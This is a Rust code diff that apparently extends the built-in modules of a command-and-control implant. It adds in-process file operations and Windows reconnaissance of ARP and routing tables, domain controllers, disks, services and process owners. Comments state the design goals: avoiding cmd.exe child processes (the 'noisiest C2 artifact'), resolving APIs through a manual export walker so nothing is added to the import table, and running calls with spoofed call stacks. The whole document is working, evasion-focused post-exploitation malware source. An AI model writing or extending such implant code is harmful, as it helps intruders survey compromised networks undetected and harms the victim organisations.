@@ -8,10 +8,17 @@
 //! (ABR-T005/T009/T010), so even the collection syscalls run with a
 //! spoofed call stack.
 
+// On-demand FFI pattern: resolutions transmute a walked export address
+// into a typed fn pointer whose signature is the let binding right
+// there. clippy::missing_transmute_annotations wants the type repeated
+// at the transmute itself — noise in this idiom, so it is silenced
+// file-wide.
+#![allow(clippy::missing_transmute_annotations)]
+
 use crate::evasion::syscalls;
 
 /// Module names accepted by [`run`] — also the operator help line.
-pub const NAMES: &str = "ps, ls <path>, cat <path>, whoami, netstat, env";
+pub const NAMES: &str = "ps, ls <path>, cat <path>, mkdir <path>, rm <path>, mv <src> <dst>, cp <src> <dst>, whoami, netstat, arp, route, domain, disks, services, env";
 
 /// Runs a built-in module by name. `args` semantics are per module.
 pub fn run(name: &str, args: &str) -> Result<Vec<u8>, String> {
@@ -19,8 +26,17 @@ pub fn run(name: &str, args: &str) -> Result<Vec<u8>, String> {
         "ps" => processes(),
         "ls" => listing(args.trim()),
         "cat" => read_file(args.trim()),
+        "mkdir" => make_dir(args.trim()),
+        "rm" => remove_path(args.trim()),
+        "mv" => move_path(args.trim()),
+        "cp" => copy_path(args.trim()),
         "whoami" => whoami(),
         "netstat" => netstat(),
+        "arp" => arp_table(),
+        "route" => route_table(),
+        "domain" => domain_info(),
+        "disks" => disks(),
+        "services" => services(),
         "env" => environment(),
         other => Err(format!("unknown module '{other}' (available: {NAMES})")),
     }
@@ -67,7 +83,7 @@ fn processes() -> Result<Vec<u8>, String> {
         }
         buffer.resize(buffer.len() * 2, 0);
     };
-    let mut out = String::from("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\n");
+    let mut out = String::from("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\tuser\n");
     for row in rows {
         out.push_str(&row);
         out.push('\n');
@@ -110,9 +126,9 @@ fn parse_processes(buffer: &[u8]) -> Vec<String> {
         } else {
             "System".to_string()
         };
-        let (path, cmdline) = query_process_details(pid as u64);
+        let (path, cmdline, user) = query_process_details(pid as u64);
         rows.push(format!(
-            "{pid}\t{ppid}\t{threads}\t{handles}\t{name}\t{path}\t{cmdline}"
+            "{pid}\t{ppid}\t{threads}\t{handles}\t{name}\t{path}\t{cmdline}\t{user}"
         ));
         if next == 0 {
             break;
@@ -220,26 +236,29 @@ const PROCESS_QUERY_LIMITED_INFORMATION: usize = 0x1000;
 const CURRENT_PROCESS: usize = usize::MAX;
 const PROCESS_IMAGE_FILE_NAME: usize = 27;
 const PROCESS_COMMAND_LINE: usize = 60;
+const TOKEN_QUERY: usize = 0x0008;
+const TOKEN_USER_CLASS: usize = 1;
 const STATUS_MASK: u32 = 0x8000_0000;
 
-/// (image path, command line) for one PID through
-/// `NtQueryInformationProcess` on a QUERY_LIMITED handle; both `-` when
-/// the process cannot be opened (protected) or the class is withheld.
-fn query_process_details(pid: u64) -> (String, String) {
+/// (image path, command line, owner) for one PID through
+/// `NtQueryInformationProcess` + a token query on a QUERY_LIMITED
+/// handle; details degrade to `-` when the process cannot be opened
+/// (protected) or a class is withheld.
+fn query_process_details(pid: u64) -> (String, String, String) {
     let query = match unsafe { syscalls::resolve("NtQueryInformationProcess") } {
         Some(q) => q,
-        None => return ("-".into(), "-".into()),
+        None => return ("-".into(), "-".into(), "-".into()),
     };
     let close = match unsafe { syscalls::resolve("NtClose") } {
         Some(c) => c,
-        None => return ("-".into(), "-".into()),
+        None => return ("-".into(), "-".into(), "-".into()),
     };
     let handle = if pid == std::process::id() as u64 {
         CURRENT_PROCESS
     } else {
         let open = match unsafe { syscalls::resolve("NtOpenProcess") } {
             Some(o) => o,
-            None => return ("-".into(), "-".into()),
+            None => return ("-".into(), "-".into(), "-".into()),
         };
         let mut attributes = ObjectAttributes {
             length: std::mem::size_of::<ObjectAttributes>() as u32,
@@ -262,17 +281,108 @@ fn query_process_details(pid: u64) -> (String, String) {
             )
         };
         if (status as u32) & STATUS_MASK != 0 || opened == 0 {
-            return ("-".into(), "-".into());
+            return ("-".into(), "-".into(), "-".into());
         }
         opened
     };
     let owned = handle != CURRENT_PROCESS;
     let path = query_unicode_class(query, handle, PROCESS_IMAGE_FILE_NAME);
     let cmdline = query_unicode_class(query, handle, PROCESS_COMMAND_LINE);
+    let user = query_process_user(handle);
     if owned {
         unsafe { syscalls::dispatch6(close, handle, 0, 0, 0, 0, 0) };
     }
-    (path, cmdline)
+    (path, cmdline, user)
+}
+
+/// Best-effort process owner: open the process token (TOKEN_QUERY) and
+/// resolve the user SID through `LookupAccountSidW`. `-` on any failure
+/// (access denied, resolver absent).
+fn query_process_user(handle: usize) -> String {
+    let open_token = match unsafe { syscalls::resolve("NtOpenProcessToken") } {
+        Some(s) => s,
+        None => return "-".into(),
+    };
+    let query_token = match unsafe { syscalls::resolve("NtQueryInformationToken") } {
+        Some(s) => s,
+        None => return "-".into(),
+    };
+    let lookup: unsafe extern "system" fn(
+        usize,
+        *mut u16,
+        *mut u32,
+        *mut u16,
+        *mut u32,
+        *mut u32,
+    ) -> i32 = match unsafe { syscalls::export_address("advapi32.dll", "LookupAccountSidW") } {
+        Some(addr) => unsafe { std::mem::transmute(addr) },
+        None => return "-".into(),
+    };
+    let mut token: usize = 0;
+    let status = unsafe {
+        syscalls::dispatch6(
+            open_token,
+            handle,
+            TOKEN_QUERY,
+            &mut token as *mut usize as usize,
+            0,
+            0,
+            0,
+        )
+    };
+    if (status as u32) & STATUS_MASK != 0 || token == 0 {
+        return "-".into();
+    }
+    let mut buffer = [0u8; 256];
+    let mut returned = 0usize;
+    let status = unsafe {
+        syscalls::dispatch6(
+            query_token,
+            token,
+            TOKEN_USER_CLASS,
+            buffer.as_mut_ptr() as usize,
+            buffer.len(),
+            &mut returned as *mut usize as usize,
+            0,
+        )
+    };
+    if (status as u32) & STATUS_MASK != 0 {
+        return "-".into();
+    }
+    // TOKEN_USER: SID_AND_ATTRIBUTES { Sid: *SID, Attributes } — the
+    // SID lives inside the same buffer.
+    let sid = usize::from_le_bytes([
+        buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5], buffer[6], buffer[7],
+    ]);
+    let start = buffer.as_ptr() as usize;
+    if sid < start || sid + 8 > start + buffer.len() {
+        return "-".into();
+    }
+    let mut name = [0u16; 256];
+    let mut domain = [0u16; 256];
+    let mut name_len = name.len() as u32;
+    let mut domain_len = domain.len() as u32;
+    let mut sid_type = 0u32;
+    let ok = unsafe {
+        lookup(
+            sid,
+            name.as_mut_ptr(),
+            &mut name_len,
+            domain.as_mut_ptr(),
+            &mut domain_len,
+            &mut sid_type,
+        )
+    };
+    if ok == 0 {
+        return "-".into();
+    }
+    let domain_text = String::from_utf16_lossy(&domain[..domain_len as usize]);
+    let name_text = String::from_utf16_lossy(&name[..name_len as usize]);
+    if domain_text.is_empty() {
+        name_text
+    } else {
+        format!("{domain_text}\\{name_text}")
+    }
 }
 
 /// One `NtQueryInformationProcess` call returning a UNICODE_STRING
@@ -621,6 +731,468 @@ fn netstat() -> Result<Vec<u8>, String> {
     Ok(out.into_bytes())
 }
 
+// --- filesystem modules (T028): in-process ops on the session thread ---
+// std::fs already runs in-process; these exist so routine file
+// management never needs a cmd.exe child (the noisiest C2 artifact).
+
+/// Creates a directory (parents included).
+fn make_dir(path: &str) -> Result<Vec<u8>, String> {
+    if path.is_empty() {
+        return Err("mkdir requires a path".into());
+    }
+    std::fs::create_dir_all(path).map_err(|e| format!("{path}: {e}"))?;
+    Ok(format!("created {path}\n").into_bytes())
+}
+
+/// Deletes a file or a directory tree.
+fn remove_path(path: &str) -> Result<Vec<u8>, String> {
+    if path.is_empty() {
+        return Err("rm requires a path".into());
+    }
+    let meta = std::fs::symlink_metadata(path).map_err(|e| format!("{path}: {e}"))?;
+    if meta.is_dir() {
+        std::fs::remove_dir_all(path).map_err(|e| format!("{path}: {e}"))?;
+    } else {
+        std::fs::remove_file(path).map_err(|e| format!("{path}: {e}"))?;
+    }
+    Ok(format!("removed {path}\n").into_bytes())
+}
+
+/// Splits "<src> <dst>" module arguments.
+fn two_paths(args: &str) -> Result<(String, String), String> {
+    let mut parts = args.split_whitespace();
+    match (parts.next(), parts.next()) {
+        (Some(src), Some(dst)) => Ok((src.to_string(), dst.to_string())),
+        _ => Err("requires <src> <dst>".into()),
+    }
+}
+
+/// Moves/renames a file or directory tree.
+fn move_path(args: &str) -> Result<Vec<u8>, String> {
+    let (src, dst) = two_paths(args)?;
+    std::fs::rename(&src, &dst).map_err(|e| format!("{src} -> {dst}: {e}"))?;
+    Ok(format!("moved {src} -> {dst}\n").into_bytes())
+}
+
+/// Copies a file (a directory copy degrades to a listing hint).
+fn copy_path(args: &str) -> Result<Vec<u8>, String> {
+    let (src, dst) = two_paths(args)?;
+    let meta = std::fs::symlink_metadata(&src).map_err(|e| format!("{src}: {e}"))?;
+    if meta.is_dir() {
+        return Err(format!("{src} is a directory - cp copies files only"));
+    }
+    std::fs::copy(&src, &dst).map_err(|e| format!("{src} -> {dst}: {e}"))?;
+    Ok(format!("copied {src} -> {dst}\n").into_bytes())
+}
+
+// --- survey modules (T029): network/domain/disk/service inventory ---
+// All resolved through the manual export walker (no import-table
+// additions), executed on the session thread.
+
+type FnPtrToU32 = unsafe extern "system" fn(usize) -> u32;
+
+fn wide(text: &str) -> Vec<u16> {
+    text.encode_utf16().chain(std::iter::once(0)).collect()
+}
+
+/// ARP table through `GetIpNetTable` — TSV: iface, address, mac, type.
+fn arp_table() -> Result<Vec<u8>, String> {
+    let get: unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32 =
+        match unsafe { syscalls::export_address("iphlpapi.dll", "GetIpNetTable") } {
+            Some(addr) => unsafe { std::mem::transmute(addr) },
+            None => return Err("GetIpNetTable unresolved".into()),
+        };
+    let mut size = 0u32;
+    let mut table = Vec::new();
+    loop {
+        let rc = unsafe { get(table.as_mut_ptr(), &mut size, 1) };
+        if rc == 0 {
+            break;
+        }
+        if rc != 122 {
+            // ERROR_INSUFFICIENT_BUFFER
+            return Err(format!("GetIpNetTable: {rc}"));
+        }
+        table.resize(size as usize, 0);
+    }
+    if table.len() < 4 {
+        return Err("empty ARP table".into());
+    }
+    let read_u32 = |off: usize| -> u32 {
+        u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
+    };
+    let entries = read_u32(0) as usize;
+    let mut out = String::from("iface\taddress\tmac\ttype\n");
+    for i in 0..entries {
+        let row = 4 + i * 24; // MIB_IPNETROW: 24 bytes
+        if row + 24 > table.len() {
+            break;
+        }
+        let entry_type = read_u32(row + 20);
+        if entry_type == 2 {
+            continue; // invalid
+        }
+        let mac_len = read_u32(row + 4).min(8) as usize;
+        let mac = (0..mac_len)
+            .map(|b| format!("{:02x}", table[row + 8 + b]))
+            .collect::<Vec<_>>()
+            .join("-");
+        let kind = match entry_type {
+            1 => "other",
+            3 => "dynamic",
+            4 => "static",
+            _ => "unknown",
+        };
+        out.push_str(&format!(
+            "{}\t{}\t{mac}\t{kind}\n",
+            read_u32(row),
+            dotted(read_u32(row + 16))
+        ));
+    }
+    Ok(out.into_bytes())
+}
+
+/// IPv4 routing table through `GetIpForwardTable` — TSV: dest, mask,
+/// next hop, metric, iface.
+fn route_table() -> Result<Vec<u8>, String> {
+    let get: unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32 =
+        match unsafe { syscalls::export_address("iphlpapi.dll", "GetIpForwardTable") } {
+            Some(addr) => unsafe { std::mem::transmute(addr) },
+            None => return Err("GetIpForwardTable unresolved".into()),
+        };
+    let mut size = 0u32;
+    let mut table = Vec::new();
+    loop {
+        let rc = unsafe { get(table.as_mut_ptr(), &mut size, 1) };
+        if rc == 0 {
+            break;
+        }
+        if rc != 122 {
+            return Err(format!("GetIpForwardTable: {rc}"));
+        }
+        table.resize(size as usize, 0);
+    }
+    if table.len() < 4 {
+        return Err("empty routing table".into());
+    }
+    let read_u32 = |off: usize| -> u32 {
+        u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
+    };
+    let entries = read_u32(0) as usize;
+    let mut out = String::from("dest\tmask\tnexthop\tmetric\tiface\n");
+    for i in 0..entries {
+        let row = 4 + i * 56; // MIB_IPFORWARDROW: 14 DWORDs
+        if row + 56 > table.len() {
+            break;
+        }
+        out.push_str(&format!(
+            "{}\t{}\t{}\t{}\t{}\n",
+            dotted(read_u32(row)),
+            dotted(read_u32(row + 4)),
+            dotted(read_u32(row + 12)),
+            read_u32(row + 36), // ForwardMetric1
+            read_u32(row + 16)  // ForwardIfIndex
+        ));
+    }
+    Ok(out.into_bytes())
+}
+
+/// Reads a null-terminated UTF-16 string from a raw pointer.
+unsafe fn utf16_at(ptr: usize) -> String {
+    if ptr == 0 {
+        return "-".into();
+    }
+    let mut len = 0usize;
+    let mut probe = ptr as *const u16;
+    while *probe != 0 && len < 512 {
+        len += 1;
+        probe = probe.add(1);
+    }
+    String::from_utf16_lossy(std::slice::from_raw_parts(ptr as *const u16, len))
+}
+
+/// Domain posture: join state (NetGetJoinInformation), DC info
+/// (DsGetDcNameW), DNS names (GetComputerNameExW) and logon env hints.
+fn domain_info() -> Result<Vec<u8>, String> {
+    let mut out = String::new();
+    let netapi =
+        |name: &str| -> Option<usize> { unsafe { syscalls::export_address("netapi32.dll", name) } };
+    let join: unsafe extern "system" fn(usize, *mut usize, *mut u32) -> u32 =
+        match netapi("NetGetJoinInformation") {
+            Some(addr) => unsafe { std::mem::transmute(addr) },
+            None => return Err("NetGetJoinInformation unresolved".into()),
+        };
+    let free: FnPtrToU32 = match netapi("NetApiBufferFree") {
+        Some(addr) => unsafe { std::mem::transmute(addr) },
+        None => return Err("NetApiBufferFree unresolved".into()),
+    };
+    let mut domain_ptr = 0usize;
+    let mut join_type = 0u32;
+    let rc = unsafe { join(0, &mut domain_ptr, &mut join_type) };
+    if rc == 0 && domain_ptr != 0 {
+        let text = unsafe { utf16_at(domain_ptr) };
+        let state = match join_type {
+            1 => "unknown",
+            2 => "workgroup",
+            3 => "domain-joined (workstation)",
+            4 => "domain-joined (server)",
+            _ => "unknown",
+        };
+        out.push_str(&format!("join={state} domain/workgroup={text}\n"));
+        unsafe { free(domain_ptr) };
+    } else {
+        out.push_str(&format!("join=query failed ({rc})\n"));
+    }
+
+    // DC discovery: fails cleanly on non-joined hosts.
+    if let Some(addr) = netapi("DsGetDcNameW") {
+        let dc: unsafe extern "system" fn(usize, usize, usize, usize, u32, *mut usize) -> u32 =
+            unsafe { std::mem::transmute(addr) };
+        let mut info = 0usize;
+        // DS_RETURN_DNS_NAME | DS_DIRECTORY_SERVICE_REQUIRED
+        let rc = unsafe { dc(0, 0, 0, 0, 0x4000_0010, &mut info) };
+        if rc == 0 && info != 0 {
+            let field = |offset: usize| -> String {
+                let ptr = usize::from_le_bytes(
+                    unsafe { std::slice::from_raw_parts((info + offset) as *const u8, 8) }
+                        .try_into()
+                        .unwrap(),
+                );
+                unsafe { utf16_at(ptr) }
+            };
+            out.push_str(&format!(
+                "dc={}\ndomain={}\nforest={}\ndc_site={}\nclient_site={}\n",
+                field(0).trim_start_matches(r"\\"),
+                field(40),
+                field(48),
+                field(64),
+                field(72)
+            ));
+            unsafe { free(info) };
+        } else {
+            out.push_str("dc=none (not domain-joined or discovery failed)\n");
+        }
+    }
+
+    // DNS identity of the machine.
+    if let Some(addr) = unsafe { syscalls::export_address("kernel32.dll", "GetComputerNameExW") } {
+        let name_ex: unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32 =
+            unsafe { std::mem::transmute(addr) };
+        for (class, label) in [(1u32, "dns_hostname"), (2u32, "dns_domain"), (3u32, "fqdn")] {
+            let mut buffer = [0u16; 256];
+            let mut len = buffer.len() as u32;
+            if unsafe { name_ex(class, buffer.as_mut_ptr(), &mut len) } != 0 {
+                let text = String::from_utf16_lossy(&buffer[..len as usize]);
+                out.push_str(&format!("{label}={text}\n"));
+            }
+        }
+    }
+    let env = |key: &str| std::env::var(key).unwrap_or_default();
+    out.push_str(&format!(
+        "logon_server={}\nuser_dns_domain={}\n",
+        env("LOGONSERVER"),
+        env("USERDNSDOMAIN")
+    ));
+    Ok(out.into_bytes())
+}
+
+/// Drive inventory: letter, fs, free/total bytes.
+fn disks() -> Result<Vec<u8>, String> {
+    let letters: unsafe extern "system" fn(u32, *mut u16) -> u32 =
+        match unsafe { syscalls::export_address("kernel32.dll", "GetLogicalDriveStringsW") } {
+            Some(addr) => unsafe { std::mem::transmute(addr) },
+            None => return Err("GetLogicalDriveStringsW unresolved".into()),
+        };
+    let free_space: unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32 =
+        match unsafe { syscalls::export_address("kernel32.dll", "GetDiskFreeSpaceExW") } {
+            Some(addr) => unsafe { std::mem::transmute(addr) },
+            None => return Err("GetDiskFreeSpaceExW unresolved".into()),
+        };
+    let volume: unsafe extern "system" fn(
+        *const u16,
+        *mut u16,
+        u32,
+        *mut u32,
+        *mut u32,
+        *mut u32,
+        *mut u16,
+        u32,
+    ) -> i32 = match unsafe { syscalls::export_address("kernel32.dll", "GetVolumeInformationW") } {
+        Some(addr) => unsafe { std::mem::transmute(addr) },
+        None => return Err("GetVolumeInformationW unresolved".into()),
+    };
+    let mut buffer = [0u16; 512];
+    let len = unsafe { letters(buffer.len() as u32, buffer.as_mut_ptr()) } as usize;
+    let mut drives = Vec::new();
+    let mut run = Vec::new();
+    for c in &buffer[..len.min(buffer.len())] {
+        if *c == 0 {
+            if run.is_empty() {
+                break;
+            }
+            drives.push(String::from_utf16_lossy(&run));
+            run.clear();
+        } else {
+            run.push(*c);
+        }
+    }
+    let mut out = String::from("drive\tfs\tfree_gb\ttotal_gb\n");
+    for drive in drives {
+        let wide_drive = wide(&drive);
+        let mut fs = [0u16; 32];
+        let mut avail = 0u64;
+        let mut total = 0u64;
+        let mut free_total = 0u64;
+        let ok_free =
+            unsafe { free_space(wide_drive.as_ptr(), &mut avail, &mut total, &mut free_total) };
+        let mut dummy = [0u32; 3];
+        let fs_ok = unsafe {
+            volume(
+                wide_drive.as_ptr(),
+                std::ptr::null_mut(),
+                0,
+                &mut dummy[0],
+                &mut dummy[1],
+                &mut dummy[2],
+                fs.as_mut_ptr(),
+                fs.len() as u32,
+            )
+        };
+        out.push_str(&format!(
+            "{}\t{}\t{}\t{}\n",
+            drive.trim_end_matches('\\'),
+            if fs_ok != 0 {
+                String::from_utf16_lossy(&fs)
+            } else {
+                "-".into()
+            },
+            if ok_free != 0 {
+                format!("{:.1}", avail as f64 / 1e9)
+            } else {
+                "-".into()
+            },
+            if ok_free != 0 {
+                format!("{:.1}", total as f64 / 1e9)
+            } else {
+                "-".into()
+            },
+        ));
+    }
+    Ok(out.into_bytes())
+}
+
+/// Service inventory through the SCM: name, state, pid, display name.
+/// The SC-manager calls follow the staging pattern of the driver
+/// lifecycle (ABR-T013) — advapi32 resolved on demand.
+fn services() -> Result<Vec<u8>, String> {
+    let open_scm: unsafe extern "system" fn(*const u16, *const u16, u32) -> usize =
+        match unsafe { syscalls::export_address("advapi32.dll", "OpenSCManagerW") } {
+            Some(addr) => unsafe { std::mem::transmute(addr) },
+            None => return Err("OpenSCManagerW unresolved".into()),
+        };
+    let enum_ex: unsafe extern "system" fn(
+        usize,
+        u32,
+        u32,
+        u32,
+        *mut u8,
+        u32,
+        *mut u32,
+        *mut u32,
+        *mut u32,
+        usize,
+    ) -> i32 = match unsafe { syscalls::export_address("advapi32.dll", "EnumServicesStatusExW") } {
+        Some(addr) => unsafe { std::mem::transmute(addr) },
+        None => return Err("EnumServicesStatusExW unresolved".into()),
+    };
+    let close: unsafe extern "system" fn(usize) -> i32 =
+        match unsafe { syscalls::export_address("advapi32.dll", "CloseServiceHandle") } {
+            Some(addr) => unsafe { std::mem::transmute(addr) },
+            None => return Err("CloseServiceHandle unresolved".into()),
+        };
+    let scm = unsafe { open_scm(std::ptr::null(), std::ptr::null(), 0x0004) }; // ENUMERATE_SERVICE
+    if scm == 0 {
+        return Err("OpenSCManagerW failed (elevation may be required)".into());
+    }
+    let mut buffer = vec![0u8; 64 * 1024];
+    let mut needed = 0u32;
+    let mut returned = 0u32;
+    let mut resume = 0u32;
+    let ok = unsafe {
+        enum_ex(
+            scm,
+            0,           // SC_ENUM_TYPE_INFO
+            0x0000_0030, // SERVICE_WIN32
+            0x0000_0003, // SERVICE_STATE_ALL
+            buffer.as_mut_ptr(),
+            buffer.len() as u32,
+            &mut needed,
+            &mut returned,
+            &mut resume,
+            0,
+        )
+    };
+    unsafe { close(scm) };
+    if ok == 0 {
+        return Err(format!(
+            "EnumServicesStatusExW failed (needed {needed} bytes)"
+        ));
+    }
+    let read_ptr =
+        |off: usize| -> usize { usize::from_le_bytes(buffer[off..off + 8].try_into().unwrap()) };
+    let read_u32 =
+        |off: usize| -> u32 { u32::from_le_bytes(buffer[off..off + 4].try_into().unwrap()) };
+    let row_str = |ptr: usize| -> String {
+        if ptr == 0 {
+            return "-".into();
+        }
+        unsafe {
+            let mut len = 0usize;
+            let mut probe = ptr as *const u16;
+            while *probe != 0 && len < 1024 {
+                len += 1;
+                probe = probe.add(1);
+            }
+            String::from_utf16_lossy(std::slice::from_raw_parts(ptr as *const u16, len))
+        }
+    };
+    const STATE: [&str; 8] = [
+        "unknown",
+        "stopped",
+        "start_pending",
+        "stop_pending",
+        "running",
+        "continue_pending",
+        "pause_pending",
+        "paused",
+    ];
+    let mut out = String::from("name\tstate\tpid\tdisplay\n");
+    // ENUM_SERVICE_STATUS_PROCESSW: ptr, ptr, SERVICE_STATUS_PROCESS
+    // (9 DWORDs) — 52 bytes, 56 with x64 alignment.
+    for i in 0..returned as usize {
+        let row = i * 56;
+        if row + 56 > buffer.len() {
+            break;
+        }
+        let name = row_str(read_ptr(row));
+        let display = row_str(read_ptr(row + 8));
+        let state = read_u32(row + 20); // ptrs(16) + dwServiceType -> dwCurrentState
+        let pid = read_u32(row + 44); // dwProcessId: 7th DWORD of the status block
+        out.push_str(&format!(
+            "{}\t{}\t{}\t{}\n",
+            name,
+            STATE[state.min(7) as usize],
+            if pid == 0 {
+                "-".to_string()
+            } else {
+                pid.to_string()
+            },
+            display
+        ));
+    }
+    Ok(out.into_bytes())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -634,7 +1206,7 @@ mod tests {
         let out = processes().expect("ps module");
         let text = String::from_utf8_lossy(&out);
         assert!(
-            text.starts_with("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\n"),
+            text.starts_with("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\tuser\n"),
             "unexpected header: {}",
             text.lines().next().unwrap_or_default()
         );
@@ -702,5 +1274,67 @@ mod tests {
         let out = environment().expect("env module");
         let text = String::from_utf8_lossy(&out);
         assert!(text.to_uppercase().contains("PATH="));
+    }
+
+    #[test]
+    fn fs_modules_roundtrip_in_tempdir() {
+        let dir = std::env::temp_dir().join(format!("abraham-fs-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let nested = dir.join("a").join("b");
+        make_dir(nested.to_str().unwrap()).expect("mkdir");
+        assert!(nested.is_dir());
+        let src = nested.join("f.txt");
+        std::fs::write(&src, b"data").unwrap();
+        let dst = nested.join("g.txt");
+        copy_path(&format!("{} {}", src.display(), dst.display())).expect("cp");
+        assert_eq!(std::fs::read(&dst).unwrap(), b"data");
+        let renamed = nested.join("h.txt");
+        move_path(&format!("{} {}", dst.display(), renamed.display())).expect("mv");
+        assert!(renamed.exists() && !dst.exists());
+        remove_path(dir.to_str().unwrap()).expect("rm");
+        assert!(!dir.exists());
+    }
+
+    #[test]
+    fn arp_lists_entries() {
+        let out = arp_table().expect("arp module");
+        let text = String::from_utf8_lossy(&out);
+        assert!(text.starts_with("iface\taddress\tmac\ttype\n"));
+        assert!(text.lines().count() >= 2, "no ARP entries: {text}");
+    }
+
+    #[test]
+    fn route_lists_entries() {
+        let out = route_table().expect("route module");
+        let text = String::from_utf8_lossy(&out);
+        assert!(text.starts_with("dest\tmask\tnexthop\tmetric\tiface\n"));
+        assert!(text.lines().count() >= 2, "no routes: {text}");
+    }
+
+    #[test]
+    fn domain_reports_join_state() {
+        let out = domain_info().expect("domain module");
+        let text = String::from_utf8_lossy(&out);
+        assert!(text.contains("join="), "no join line: {text}");
+        assert!(text.contains("dns_hostname="));
+    }
+
+    #[test]
+    fn disks_lists_the_system_drive() {
+        let out = disks().expect("disks module");
+        let text = String::from_utf8_lossy(&out);
+        assert!(text.starts_with("drive\tfs\tfree_gb\ttotal_gb\n"));
+        assert!(text.contains("C:"), "no C: drive: {text}");
+    }
+
+    #[test]
+    fn services_lists_state_and_pid() {
+        // SCM enumeration may require elevation; skip gracefully.
+        let Ok(out) = services() else {
+            return;
+        };
+        let text = String::from_utf8_lossy(&out);
+        assert!(text.starts_with("name\tstate\tpid\tdisplay\n"));
+        assert!(text.lines().count() >= 2, "no services: {text}");
     }
 }
